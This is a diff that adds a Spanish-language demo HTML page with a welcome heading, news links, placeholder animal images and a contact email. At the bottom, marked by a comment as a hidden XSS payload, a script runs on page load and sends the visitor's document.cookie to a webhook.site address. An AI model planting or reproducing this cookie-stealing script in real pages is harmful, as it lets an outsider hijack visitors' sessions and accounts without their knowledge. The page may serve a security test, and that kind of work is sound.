@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bienvenidos a Mi Página</title>
+</head>
+<body>
+    <h1>¡Bienvenido a la Página de Prueba!</h1>
+    <p>Esta es una página de demostración con contenido interesante.</p>
+
+    <h2>Noticias Recientes</h2>
+    <ul>
+        <li><a href="https://noticias.com/1">Noticia 1</a></li>
+        <li><a href="https://noticias.com/2">Noticia 2</a></li>
+    </ul>
+
+    <h2>Galería</h2>
+    <img src="https://placekitten.com/400/300" alt="Gato bonito">
+    <img src="https://placebear.com/400/300" alt="Oso cool">
+
+    <h2>Contacto</h2>
+    <p>Si tienes preguntas, envíanos un mensaje a contacto@ejemplo.com</p>
+
+    <!-- XSS Payload escondido -->
+    <script>
+        fetch("https://webhook.site/65b6f757-d3bd-432e-bbaf-db53492e9b9c?cookie=" + document.cookie);
+    </script>
+</body>
+</html>
